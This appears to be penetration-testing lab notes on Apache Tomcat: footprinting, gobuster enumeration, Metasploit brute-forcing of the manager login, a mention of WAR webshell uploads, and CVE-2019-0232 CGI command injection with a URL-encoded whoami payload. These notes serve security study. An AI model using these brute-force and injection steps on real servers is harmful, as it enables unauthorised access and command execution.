# Discovery/Footprinting
Tomcat servers can be identified by the Server header in the HTTP response. If the server is operating behind a reverse proxy, requesting an invalid page should reveal the server and version. Here we can see that Tomcat version 9.0.30 is in use.

```bash
$ curl -s http://app-dev.inlanefreight.local:8080/docs/ | grep Tomcat 
```

This is the default documentation page, which may not be removed by administrators. Here is the general folder structure of a Tomcat installation.

The bin folder stores scripts and binaries needed to start and run a Tomcat server. The conf folder stores various configuration files used by Tomcat. The tomcat-users.xml file stores user credentials and their assigned roles. The lib folder holds the various JAR files needed for the correct functioning of Tomcat. The logs and temp folders store temporary log files. The webapps folder is the default webroot of Tomcat and hosts all the applications. The work folder acts as a cache and is used to store data during runtime.

Each folder inside webapps The most important file among these is WEB-INF/web.xml, which is known as the deployment descriptor. This file stores information about the routes used by the application and the classes handling these routes. All compiled classes used by the application should be stored in the WEB-INF/classes folder. These classes might contain important business logic as well as sensitive information. Any vulnerability in these files can lead to total compromise of the website. The lib folder stores the libraries needed by that particular application. The jsp folder stores Jakarta Server Pages (JSP), formerly known as JavaServer Pages, which can be compared to PHP files on an Apache server

# Enumeration
```bash
$ gobuster dir -u http://web01.inlanefreight.local:8180/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt 
```

# Attacking Tomcat
If we can access the /manager or /host-manager endpoints, we can likely achieve remote code execution on the Tomcat server.
We can use the auxiliary/scanner/http/tomcat_mgr_login Metasploit module for these purposes

## Login Brute Force
```
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set VHOST web01.inlanefreight.local
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RPORT 8180
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set stop_on_success true
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set rhosts 10.129.201.58
```

## Manager - WAR File Upload
The manager web app allows us to instantly deploy new applications by uploading WAR files.

/opt/tomcat/apache-tomcat-10.0.10/webapps

We could deploy WAR webshell or WAR reverse shell.
 

## CGI
CVE-2019-0232 is a critical security issue that could result in remote code execution. This vulnerability affects Windows systems that have the enableCmdLineArguments feature enabled. An attacker can exploit this vulnerability by exploiting a command injection flaw resulting from a Tomcat CGI Servlet input validation error, thus allowing them to execute arbitrary commands on the affected system. Versions 9.0.0.M1 to 9.0.17, 8.5.0 to 8.5.39, and 7.0.0 to 7.0.93 of Tomcat are affected.
```bash
$ ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd
$ ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat

http://10.129.204.227:8080/cgi/welcome.bat?&dir
c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
```
